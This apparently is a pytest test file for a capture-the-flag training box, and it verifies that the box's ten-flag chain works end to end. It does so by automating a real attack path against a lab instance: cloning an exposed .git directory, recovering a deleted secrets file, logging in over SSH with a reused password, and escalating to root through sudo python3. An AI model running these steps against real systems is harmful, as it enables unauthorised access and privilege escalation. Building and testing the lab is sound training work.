"""Phase 14 verification: cloudbreak-beginner-gitleak -- the Beginner
tier of "Cloudbreak Pipeline". A real exposed .git directory, built
fresh every boot (boxes-src/cloudbreak-beginner-gitleak/docker/
entrypoint.sh) so per-team flags live inside the actual commit blobs:
commit 1 adds a deploy-secrets file alongside the rest of the site,
commit 2 removes it ("security cleanup before launch"). The live
docroot (nginx's own working tree, checked out at HEAD) genuinely does
NOT contain that file -- it's recoverable only via the .git directory's
history, exactly the real-world "exposed .git directory" bug class
(very common in bug-bounty writeups), verified here with an actual
`git clone http://.../.git`, not just an HTTP GET of individual files.
`git update-server-info` runs after the commits -- without it the
clone 404s even though every object is genuinely fetchable, a real gap
found building this box.

Plain single-host box, no backend-specific dependency, works on both
Docker and Kubernetes. 10 real flags, climbing difficulty: web recon
(flags 1-3) -> recovering a removed secret via real git history
archaeology (flag 4) -> the hidden-but-live admin panel path that
secret reveals (flag 5) -> SSH foothold via the reused credential
(flag 6) -> a sudo/GTFOBins ('python3') privesc hint (flag 7) -> a
root-only file read via the GTFOBins escape (flag 8) -> a
post-escalation checkpoint (flag 9) -> the final root flag (flag 10).

Real HTTP, a real `git clone`, real SSH, a real privilege escalation --
no mocks. Requires the box image already built
(ctf-boxes/cloudbreak-beginner-gitleak:latest), `git` and `sshpass` on
PATH, and a running orchestrator reachable at ORCHESTRATOR_TEST_URL.
"""
import hashlib
import hmac
import os
import secrets as pysecrets
import subprocess
import tempfile

import pytest
import requests

BASE_URL = os.environ.get("ORCHESTRATOR_TEST_URL", "http://127.0.0.1:9100")
BOX_ID = "cloudbreak-beginner-gitleak"
_TEAM_ID_BASE = pysecrets.randbelow(1_000_000)

DEPLOY_PASSWORD = "CorpNimbus-Staging-88!"  # fixed/narrative -- discoverable via the git-history-only secret


def expected_flag(secret: str, n: int) -> str:
    digest = hmac.new(secret.encode(), f"{BOX_ID}:{n}".encode(), hashlib.sha256).hexdigest()
    return f"HLC{{{digest[:10]}}}"


def _port(inst: dict, container_port: int) -> int:
    for p in inst["ports"]:
        if p["container_port"] == container_port:
            return p["host_port"]
    raise AssertionError(f"no port {container_port} in instance ports: {inst['ports']}")


def _clone_exposed_git(host: str, port: int) -> str:
    """Mirrors the real player path: an actual `git clone` against the
    exposed .git directory (not a tool that walks objects individually)
    -- requires the box's own `git update-server-info` to have run."""
    tmp = tempfile.mkdtemp()
    dest = os.path.join(tmp, "dump")
    result = subprocess.run(
        ["git", "clone", f"http://{host}:{port}/.git", dest],
        capture_output=True, text=True, timeout=30,
    )
    assert result.returncode == 0, f"git clone of the exposed .git failed: {result.stderr}"
    return dest


def _recover_removed_secret(repo_path: str) -> str:
    log = subprocess.run(
        ["git", "-C", repo_path, "log", "--all", "--format=%H"],
        capture_output=True, text=True, timeout=10,
    )
    commits = log.stdout.strip().splitlines()
    assert len(commits) >= 2, f"expected at least 2 commits in history, got: {commits}"
    first_commit = commits[-1]  # oldest, where secrets.yml was still present
    show = subprocess.run(
        ["git", "-C", repo_path, "show", f"{first_commit}:secrets.yml"],
        capture_output=True, text=True, timeout=10,
    )
    assert show.returncode == 0, f"secrets.yml not recoverable from history: {show.stderr}"
    return show.stdout


def _ssh(host: str, port: int, command: str, timeout: float = 20.0):
    return subprocess.run(
        [
            "sshpass", "-p", DEPLOY_PASSWORD, "ssh",
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
            "-p", str(port), f"ops-deploy@{host}", command,
        ],
        capture_output=True, text=True, timeout=timeout,
    )


def _escalate_via_python3(host: str, port: int, shell_command: str) -> str:
    """The box's one intended privesc: ops-deploy has passwordless
    sudo on /usr/bin/python3 -- the classic GTFOBins subprocess spawn,
    run as root."""
    py = f"import subprocess; print(subprocess.run({shell_command!r}, capture_output=True, text=True).stdout, end='')"
    result = _ssh(host, port, f"sudo python3 -c \"{py}\"")
    assert result.returncode == 0, f"GTFOBins escalation failed: {result.stderr}"
    return result.stdout


@pytest.fixture(params=["docker", "kubernetes"])
def box_instance(request):
    backend = request.param
    team_id = _TEAM_ID_BASE + (1 if backend == "docker" else 2)
    secret = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id, "box_id": BOX_ID, "team_secret": secret, "backend": backend},
    )
    r.raise_for_status()
    inst = r.json()
    try:
        yield inst, secret, backend
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")


def test_full_ten_flag_chain(box_instance):
    inst, secret, backend = box_instance
    host = inst["entry_host"]
    web_port, ssh_port = _port(inst, 80), _port(inst, 22)
    base = f"http://{host}:{web_port}"

    # Flags 1-3: plain web recon.
    index = requests.get(f"{base}/", timeout=10).text
    assert expected_flag(secret, 1) in index
    status = requests.get(f"{base}/status.html", timeout=10).text
    assert expected_flag(secret, 2) in status
    robots = requests.get(f"{base}/robots.txt", timeout=10).text
    assert expected_flag(secret, 3) in robots
    assert "/.git/" in robots  # the ironic tell

    # Confirm .git is genuinely exposed, then do a real clone.
    head = requests.get(f"{base}/.git/HEAD", timeout=10).text
    assert head.startswith("ref:")
    repo_path = _clone_exposed_git(host, web_port)

    # Flag 4: recovering the removed secrets.yml from git history.
    secrets_content = _recover_removed_secret(repo_path)
    assert expected_flag(secret, 4) in secrets_content
    assert DEPLOY_PASSWORD in secrets_content
    assert "admin-x7f3/panel.html" in secrets_content  # the hint toward the hidden panel

    # Flag 5: the hidden-but-live admin panel the secret pointed at.
    panel = requests.get(f"{base}/admin-x7f3/panel.html", timeout=10).text
    assert expected_flag(secret, 5) in panel

    # Flag 6: SSH foothold via the reused credential.
    user_txt = _ssh(host, ssh_port, "cat user.txt")
    assert user_txt.returncode == 0, user_txt.stderr
    assert expected_flag(secret, 6) in user_txt.stdout

    # Flag 7: a hint file pointing at the sudo/GTFOBins privesc.
    notes = _ssh(host, ssh_port, "cat notes.txt")
    assert expected_flag(secret, 7) in notes.stdout
    sudo_l = _ssh(host, ssh_port, "sudo -l")
    assert "/usr/bin/python3" in sudo_l.stdout

    # Flag 8: a root-only file, read via the GTFOBins escape before going for a full shell.
    audit_log = _escalate_via_python3(host, ssh_port, ["cat", "/var/log/deploy-audit.log"])
    assert expected_flag(secret, 8) in audit_log

    # Flags 9-10: full root shell via the same escape.
    root_output = _escalate_via_python3(host, ssh_port, ["cat", "/root/decommission_notes.txt", "/root/root.txt"])
    assert expected_flag(secret, 9) in root_output
    assert expected_flag(secret, 10) in root_output


def test_idempotent_create(box_instance):
    inst, secret, backend = box_instance
    r = requests.post(
        f"{BASE_URL}/instances",
        json={
            "team_id": inst["team_id"], "box_id": BOX_ID, "team_secret": "a-different-secret-must-be-ignored",
            "backend": backend,
        },
    )
    r.raise_for_status()
    assert r.json()["instance_id"] == inst["instance_id"]


def test_cross_team_flag_isolation(box_instance):
    inst, secret, backend = box_instance
    team_id_b = inst["team_id"] + 1000
    secret_b = pysecrets.token_hex(32)
    r = requests.post(
        f"{BASE_URL}/instances",
        json={"team_id": team_id_b, "box_id": BOX_ID, "team_secret": secret_b, "backend": backend},
    )
    r.raise_for_status()
    inst_b = r.json()
    try:
        host_a, port_a = inst["entry_host"], _port(inst, 80)
        host_b, port_b = inst_b["entry_host"], _port(inst_b, 80)
        index_a = requests.get(f"http://{host_a}:{port_a}/", timeout=10).text
        index_b = requests.get(f"http://{host_b}:{port_b}/", timeout=10).text
        assert expected_flag(secret, 1) in index_a
        assert expected_flag(secret_b, 1) in index_b
        assert expected_flag(secret, 1) != expected_flag(secret_b, 1)
        assert expected_flag(secret, 1) not in index_b
    finally:
        resp = requests.delete(f"{BASE_URL}/instances/{inst_b['instance_id']}")
        if not resp.ok:
            raise AssertionError(f"teardown failed to destroy instance: {resp.status_code} {resp.text}")
